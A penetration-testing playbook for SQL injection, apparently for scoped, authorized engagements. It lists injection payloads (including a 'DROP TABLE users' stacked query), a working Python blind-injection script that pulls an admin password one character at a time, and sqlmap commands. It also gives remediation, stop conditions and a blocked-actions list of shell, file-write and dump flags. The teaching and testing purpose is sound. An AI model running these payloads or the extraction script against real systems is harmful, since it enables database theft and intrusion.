# SQL Injection (SQLi) — Playbook

## Vulnerability Description

**OWASP:** A03:2021 — Injection
**CWE:** CWE-89 (SQL Injection)

SQL Injection occurs when untrusted user input is embedded directly into SQL queries without proper sanitization or parameterization. An attacker can manipulate the query to read, modify, or delete database content, bypass authentication, or execute administrative operations on the database server.

---

## Types

| Type | Description | Example Indicator |
|---|---|---|
| **Error-based** | Database error messages reveal query structure or data | `You have an error in your SQL syntax...` |
| **Boolean-based (blind)** | True/false conditions cause different page responses | `' OR 1=1--` returns valid content, `' AND 1=2--` returns empty/error |
| **Time-based (blind)** | Conditional queries cause measurable delays | `' OR IF(1=1,SLEEP(5),0)--` causes 5s delay |
| **UNION-based** | `UNION SELECT` appends attacker-controlled rows to the result set | `' UNION SELECT NULL,NULL,NULL--` |
| **Stacked queries** | Multiple statements executed sequentially (MS SQL, PostgreSQL) | `'; DROP TABLE users--` |

---

## Detection

### Manual Testing

```sql
-- Basic boolean test
' OR 1=1--
' OR 1=2--

-- UNION column count enumeration
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- String-based column detection
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--

-- Database fingerprinting
' UNION SELECT @@version,NULL,NULL--  (MSSQL/MySQL)
' UNION SELECT version(),NULL,NULL--   (PostgreSQL)

-- Error-based triggers
' AND 1=CONVERT(int, @@version)--
' AND 1=CAST(1 AS INT)--              (intentional type mismatch)

-- Time-based blind
' OR IF(1=1,SLEEP(5),0)--             (MySQL)
' OR pg_sleep(5)--                     (PostgreSQL)
'; WAITFOR DELAY '0:0:5'--            (MSSQL)

-- Boolean-based blind detection
# Compare response size/content between true and false conditions
# Use a Python script to automate binary search on each character
' AND SUBSTRING((SELECT password FROM Users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM Users LIMIT 1),1,1)='b'--
```

### Blind SQLi Automation (Python)

```python
import requests, string

url = "<target>/rest/products/search?q="
chars = string.ascii_lowercase + string.digits
extracted = ""

for pos in range(1, 40):
    for c in chars:
        # Boolean-based: check if char at position matches
        payload = f"apple')) OR (SELECT SUBSTR(password,{pos},1) FROM Users WHERE email='admin@test.com')='{c}'--"
        r = requests.get(url + requests.utils.quote(payload, safe=''))
        if '"data"' in r.text:
            extracted += c
            print(f"[+] Position {pos}: {c} → Current: {extracted}")
            break
    else:
        break  # No more characters
print(f"Extracted: {extracted}")
```

### Observing Responses

- **Error messages**: Look for SQL syntax errors, stack traces, or DBMS version strings in HTML responses.
- **Content differences**: Compare the response body length between true vs. false conditions.
- **Response timing**: Measure request/response time for `SLEEP`/`WAITFOR` payloads vs. benign requests.

---

## Tools

| Tool | Usage | Notes |
|---|---|---|
| **sqlmap** | `sqlmap -u '<url>' --batch --risk=1 --level=1` | Read-only recon only |
| **sqlmap (enumerate)** | `sqlmap -u '<url>' --batch --dbs` | Safe — only lists database names |
| **sqlmap (current user)** | `sqlmap -u '<url>' --batch --current-user` | Safe — read-only |
| **arjun** | `arjun -u '<url>' --get` | Parameter discovery |
| **curl** | Manual payload injection | For fine-grained testing |

### Virtual hosts without `/etc/hosts`

When an authorised vhost does not resolve locally, connect to the in-scope IP and
send the vhost in the request instead of editing host networking:

```bash
sqlmap -u 'http://<in-scope-ip>/<path>?<parameter>=<value>' \
  -H 'Host: <authorised-vhost>' --batch --risk=1 --level=1
```

Save the captured request or exact working invocation as exploitation evidence.

> ⚠️ **BLOCKED sqlmap flags:** `--dump` (data exfiltration), `--os-shell`, `--file-write`, `--file-read` (unless explicitly authorized).

---

## Internet Research

Use these search patterns to find real-world context:

- `<product> SQLi exploit`
- `<CVE-ID> sqli PoC`
- `site:hackerone.com SQL injection`
- `site:portswigger.net SQL injection`
- `<product> sqlmap tamper script`

---

## Safe Proof of Concept

Read-only operations that prove injection without exfiltrating data:

```bash
# List databases (read-only metadata)
sqlmap -u 'https://target.com/page?id=1' --batch --dbs

# Current database user (read-only)
sqlmap -u 'https://target.com/page?id=1' --batch --current-user

# Current database name (read-only)
sqlmap -u 'https://target.com/page?id=1' --batch --current-db

# Manual boolean-based proof
curl -s -o /dev/null -w "Time: %{time_total}\n" 'https://target.com/page?id=1%27%20OR%20SLEEP(5)--'
```

---

## Evidence

Each finding should include:

```
**Vulnerability:** SQL Injection
**URL:** https://target.com/page?id=1
**Parameter:** id
**Payload:** ' OR SLEEP(5)--
**Type:** Time-based blind (MySQL)
**Command:**
  sqlmap -u 'https://target.com/page?id=1' --batch --current-db
**Output:**
  current database: 'target_db'
**Response time with payload:** 5.02s
**Response time without:** 0.03s
**Remediation:** Use parameterized queries / prepared statements
```

---

## Evidence to Save

- Tool output → `$ENG_DIR/evidence/exploitation/sqli/<finding>.*`
- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`
- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`

---

## Remediation

| Measure | Description |
|---|---|
| **Parameterized queries (prepared statements)** | Never concatenate user input into SQL strings. Use placeholders (`?`, `$1`, `:param`). |
| **Input validation** | Whitelist allowed characters and types. Reject unexpected input server-side. |
| **WAF (Web Application Firewall)** | Layer 7 filtering can block common SQLi payloads (defense-in-depth — not a replacement for parameterization). |
| **Least-privilege DB user** | Application DB account should only have `SELECT` / `INSERT` / `UPDATE` on required tables — never `DROP`, `CREATE`, or administrative roles. |
| **ORM frameworks** | Use an ORM (SQLAlchemy, Entity Framework, Hibernate) that handles parameterization automatically. |
| **Error handling** | Never expose raw database errors to the client. Log them server-side and return a generic error page. |

---

## Stop Conditions
- Payload causes server error/timeout → pause and assess
- Access to sensitive data beyond scope → stop and notify

## Blocked Actions

The following are **never** permitted during authorized testing unless explicitly approved in writing:

| Action | Risk |
|---|---|
| `--dump` tables/data | Data exfiltration |
| `--os-shell` | Full server compromise |
| `--file-write` | Writing webshells or malicious files |
| `--file-read` (without explicit scope) | Reading sensitive files |
| `DROP TABLE/DB` | Destructive data loss |
| `DELETE` / `UPDATE` (destructive) | Data modification |
| `INSERT` (malicious) | Data injection |
| Stacked queries on production | Uncontrolled impact |
---

last_updated: 2026-07-05
updated_reason: |
  Retrospective gap analysis: blind SQLi sub-technique was missing.
  Added boolean-based blind detection payloads and Python automation script.
